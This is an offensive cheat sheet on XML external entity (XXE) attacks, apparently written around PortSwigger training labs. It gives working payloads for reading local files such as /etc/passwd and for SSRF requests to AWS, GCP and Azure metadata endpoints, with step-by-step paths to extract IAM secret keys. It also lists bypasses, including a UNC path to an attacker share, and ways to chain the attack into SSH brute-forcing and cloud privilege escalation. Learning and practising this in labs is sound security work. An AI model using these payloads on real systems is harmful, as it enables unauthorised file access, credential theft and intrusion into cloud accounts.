# XXE - Basic file read and SSRF

Inject a `<!DOCTYPE>` declaring an external entity that points to a local file or internal URL. Reference the entity in the XML body - the parser substitutes its value, and the application reflects the content in its response.

## Quick reference
```xml
<!-- File read (/etc/passwd) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>

<!-- SSRF - cloud metadata -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
<!-- response contains folder name -> iterate URL path until you reach IAM creds -->
<!-- final URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/admin -->
```

## Root cause
XML parser processes `SYSTEM` entities and inlines the fetched content before the application reads the XML values. No filtering on entity targets - any `file://` path or `http://` URL is fetched by the server.

## Find it
1. Intercept any XML POST body (stock checker, search, import).
2. Add `<!DOCTYPE test [ <!ENTITY test "burp"> ]>` before the root element.
3. Reference `&test;` in a text node.
4. If response changes to reflect "burp" -> external entity processing enabled.
5. Escalate to `file:///etc/passwd`.

## Technique
**File read:**
1. Intercept `POST /product/stock` (or equivalent XML endpoint).
2. Insert DOCTYPE declaration after `<?xml` line and before root element:
   ```xml
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   ```
3. Replace any text-node value (e.g., `<productId>1</productId>`) with `<productId>&xxe;</productId>`.
4. Send - response contains "Invalid product ID:" followed by `/etc/passwd` contents.

**SSRF (cloud metadata):**
1. Same injection point; change entity URL to `http://169.254.169.254/`.
2. Response contains a folder name (e.g., `latest`).
3. Update URL to `http://169.254.169.254/latest/` -> next path segment appears.
4. Continue: `/latest/meta-data/` -> `/latest/meta-data/iam/` -> `/latest/meta-data/iam/security-credentials/` -> `/latest/meta-data/iam/security-credentials/admin`.
5. Final response contains JSON with `SecretAccessKey`.

## Payload arsenal
```xml
<!-- file read -->
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///proc/self/cmdline"> ]>

<!-- SSRF targets -->
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin  (AWS)
http://metadata.google.internal/computeMetadata/v1/                      (GCP)
http://169.254.169.254/metadata/instance?api-version=2021-02-01          (Azure)
http://internal-service/                                                  (pivot)
```

## Bypasses
| Defense | Bypass |
|---|---|
| Response doesn't reflect entity | Try error-based or OOB - see Blind-data-exfiltration/ |
| `file://` blocked | Try UNC path `\\attacker\share` or `php://filter` |
| Entity reference stripped from output | Check if reflected in error messages |

## Exploitation walkthrough
**Lab 1 (file read):** Intercept stock check POST -> insert `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` -> replace `<productId>1</productId>` with `<productId>&xxe;</productId>` -> response: `Invalid product ID: root:x:0:0:root:/root:/bin/bash...`

**Lab 2 (SSRF):** Same injection, URL = `http://169.254.169.254/` -> response = `latest` -> update to `/latest/` -> iterate -> final URL: `/latest/meta-data/iam/security-credentials/admin` -> JSON with `SecretAccessKey`.

## Chaining
- `/etc/passwd` -> usernames -> brute SSH / password spray
- Cloud metadata -> IAM credentials -> cloud privilege escalation
- Internal SSRF -> pivot to [SSRF](../../SSRF/) chain against internal services

## Tools
- **Burp Repeater** - iterate SSRF path and test entity substitution

## Labs

### Exploiting XXE using external entities to retrieve files [Apprentice]
Inject `file:///etc/passwd` entity into stock check XML. Reference `&xxe;` in productId. Response reflects file contents. Key insight: the parser fetches and inlines the file content; the application blindly includes it in the error message.

### Exploiting XXE to perform SSRF attacks [Apprentice]
Inject `http://169.254.169.254/` entity. Iteratively follow the path shown in each response until reaching IAM credentials endpoint. Key insight: same XXE mechanism but SYSTEM URL points to internal HTTP - the server makes the request on the attacker's behalf.

## Real-world notes
- Cloud metadata SSRF via XXE is one of the highest-impact XXE chains - instant credential access.
- SOAP endpoints and legacy XML APIs are prime targets; they almost never strip entity declarations.
- Always try both `file:///etc/passwd` and `file:///etc/hostname` - hostname often needed for lab submission.

## References
- https://portswigger.net/web-security/xxe
